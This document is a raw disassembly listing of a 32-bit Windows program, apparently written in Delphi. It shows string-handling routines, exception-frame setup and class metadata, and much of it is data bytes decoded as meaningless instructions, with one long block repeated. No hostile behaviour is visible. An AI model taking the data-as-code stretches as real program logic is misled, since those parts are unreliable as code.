inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4603b0
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_40427c
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404488
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_45fdd4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_462e1c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4630cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4630d3
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_403fe0
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_404054
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_4603b0
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_40427c
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45fdd4
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_40427c
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_462a00
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40bdc8
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_40427c
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40bdc8
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044dc
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4044dc
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4042c8
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4044dc
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_40427c
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_40427c
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_4044dc
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40433c
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_4041a4
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404284
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404488
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404488
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_40427c
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044dc
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_4041a4
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_40427c
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4044dc
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40433c
inc edi
sub_4630e0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_40427c
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_45fdd4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_45ffa4
mov edx eax
mov ebp edi
jmp r-xdata
sub_46313c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463161
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463168
retn
sub_463204
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463229
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463230
retn
sub_463416
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f430b00
outsb
outsb
arpl [ gs : ebp + ecx * 2 + 0x6f ] si
add [ gs : eax ] dl
inc eax
add bh al
add [ eax ] al
inc [ esi + ecx * 2 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] cl
popad
je r-xdata
dec edi
jo r-xdata
push 0xdc737261
adc [ ecx ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edi ] al
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0xe00464f ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
inc eax
xor eax 0xe070046
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
call 0xffffffff90467b89
and eax [ ecx ]
pop es
add [ eax ] al
xchg esp eax
and al [ ecx ]
outsb
nop
call sub_467ad5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xor eax 0x35400046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
xor eax r--data
add [ eax ] ah
xor al [ eax ]
int3
fcom [ eax ]
inc ecx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
xor al 0x1a
inc ecx
add [ eax ] dh
add [ eax ] al
call [ ecx + edx * 2 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add eax 0x656e694c
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi ] dh
inc esi
add [ esi + 0x48004636 ] dl
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
xor eax [ esi ]
xor al 0x0
add bh bh
cld
dec edi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070004 ] al
inc ebx
outsd
outsb
jbe r-xdata
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x40109400
add [ ecx + edx * 2 + 0x46 ] ah
add [ eax + 0x1004651 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040002 ] al
js r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
test [ eax + 0x46 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070005 ] al
dec ecx
je r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
cmp al 0x58
inc esi
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add al bh
push edi
inc esi
add [ edx ] al
add bh ch
inc eax
add [ edx + esi ] al
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
pop eax
inc esi
add [ eax ] al
add [ eax ] al
insd
fcom [ eax ]
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080006 ] al
sub_4636f8
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
js r-xdata
js r-xdata
jb r-xdata
inc esi
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x37
inc esi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
outsb
inc ebp
js r-xdata
add [ 0x656e694c ] al
jae r-xdata
jb r-xdata
add al dl
push edi
inc esi
add al ah
xchg edi eax
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffb9c9 ] bh
aaa
inc esi
add [ eax + eax ] cl
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
mov [ edi ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
aaa
js r-xdata
adc [ ecx ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
fcom [ eax ]
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x54
je r-xdata
add [ eax ] ah
cmp [ esi ] eax
inc eax
cmp [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor bh [ ecx ]
xor al 0x1a
inc ecx
add [ eax ] dh
add [ eax ] al
call [ eax ]
push esi
inc esi
add [ ecx ] al
loopne r-xdata
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x4110dc73
add [ eax ] bh
add [ eax ] al
insd
mov [ edi ] dh
inc esi
add [ eax + 0x7004123 ] dl
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4636a800
add [ eax + eax ] dh
add bh bh
test al 0x55
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
call 0x68467f30
inc eax
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
rol [ eax + 0x39 ] 0x46
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax ] cl
aas
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
outsb
push eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
jb r-xdata
pop es
push esp
inc esp
dec ebp
jb r-xdata
mov eax eax
inc eax
cmp [ esi ] eax
pop es
cmp [ esi ] al
nop
and eax [ ecx ]
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
test al 0x39
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004639 ] ch
add [ eax ] al
add ah ch
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or [ ebp + 0x44 ] eax
inc ebp
jb r-xdata
outsd
outsb
jbe r-xdata
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add al al
pop esi
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
outsd
jb r-xdata
fwait
inc ecx
add [ edx * 2 + 0x10046 ] ch
out dx eax
adc [ eax ] al
mov eax 0xe4004655
push ebp
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
js r-xdata
jb r-xdata
add [ edi ] al
inc esi
rol [ eax ] 0x3a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
cmp al [ esi ]
push esp
cmp al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
cmp al [ esi ]
inc eax
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
clc
pop esi
inc esi
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc esp
push ebx
jb r-xdata
inc esi
add [ eax + 0x40 ] ch
add [ eax ] al
add [ esi ] al
cmp eax [ esi ]
dec eax
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
jb r-xdata
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
mov eax 0x700463b
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x3b886d65
inc esi
add ah ah
pop ss
inc ecx
add [ ecx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
fcom [ ecx + 0x46 ]
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
jb r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
insd
nop
push esp
cmp al [ esi ]
pop es
or al 0x54
inc esp
push ebx
jb r-xdata
call sub_408b94
jmp r-xdata
insd
nop
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1400463b ] ah
add [ eax ] al
add [ eax + 0x17 ] dh
outsd
outsb
jbe r-xdata
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cf1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
add [ eax ] dl
fwait
inc ecx
add [ ecx + ebx * 2 ] dh
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
cmp al [ esi ]
nop
and eax [ ecx ]
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
mov [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x3bb80046 ] dl
inc esi
add [ eax ] al
add [ eax ] al
sbb [ ebx ] bh
inc esi
add [ edi ] al
or al 0x54
add al cl
xor al 0x40
shl [ eax + eax * 2 ] 0x0
inc esp
xchg esp eax
inc ecx
je r-xdata
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
insd
add [ edx ] bh
inc esi
add [ eax + 0x2004123 ] dl
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
les edi [ edx ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
cmp al [ esi ]
sbb [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4638a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx ] bh
inc esi
add [ eax + 0x39 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
cmp [ esi ] eax
dec esp
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
call 0x68467f30
inc eax
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax ] cl
aas
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc esi
add [ eax + eax ] cl
rol [ eax + 0x39 ] 0x46
pop es
push esp
inc esp
dec ebp
jb r-xdata
mov eax eax
inc eax
cmp [ esi ] eax
pop es
cmp [ esi ] al
nop
and eax [ ecx ]
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
test al 0x39
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004639 ] ch
add [ eax ] al
add ah ch
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or [ ebp + 0x44 ] eax
inc ebp
jb r-xdata
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add al al
pop esi
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
outsd
jb r-xdata
js r-xdata
jb r-xdata
add [ edi ] al
inc esi
rol [ eax ] 0x3a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
cmp al [ esi ]
push esp
cmp al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
cmp al [ esi ]
inc eax
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
clc
pop esi
inc esi
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc esp
push ebx
jb r-xdata
inc esi
add [ eax + 0x40 ] ch
add [ eax ] al
add [ esi ] al
cmp eax [ esi ]
dec eax
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
jb r-xdata
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
mov eax 0x700463b
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x3b886d65
inc esi
add ah ah
pop ss
inc ecx
add [ ecx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
fcom [ ecx + 0x46 ]
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi + 0xe0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
jb r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
insd
nop
push esp
cmp al [ esi ]
pop es
or al 0x54
inc esp
push ebx
jb r-xdata
call sub_408b94
jmp r-xdata
insd
nop
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1400463b ] ah
add [ eax ] al
add [ eax + 0x17 ] dh
outsd
outsb
jbe r-xdata
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cf1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
add [ eax ] dl
fwait
inc ecx
add [ ecx + ebx * 2 ] dh
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
cmp al [ esi ]
nop
and eax [ ecx ]
add al [ eax ]
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
mov [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x3bb80046 ] dl
inc esi
add [ eax ] al
add [ eax ] al
sbb [ ebx ] bh
inc esi
add [ edi ] al
or al 0x54
add al cl
xor al 0x40
shl [ eax + eax * 2 ] 0x0
inc esp
xchg esp eax
inc ecx
je r-xdata
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
insd
add [ edx ] bh
inc esi
add [ eax + 0x2004123 ] dl
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
les edi [ edx ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
cmp al [ esi ]
sbb [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_463bf8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_463cea
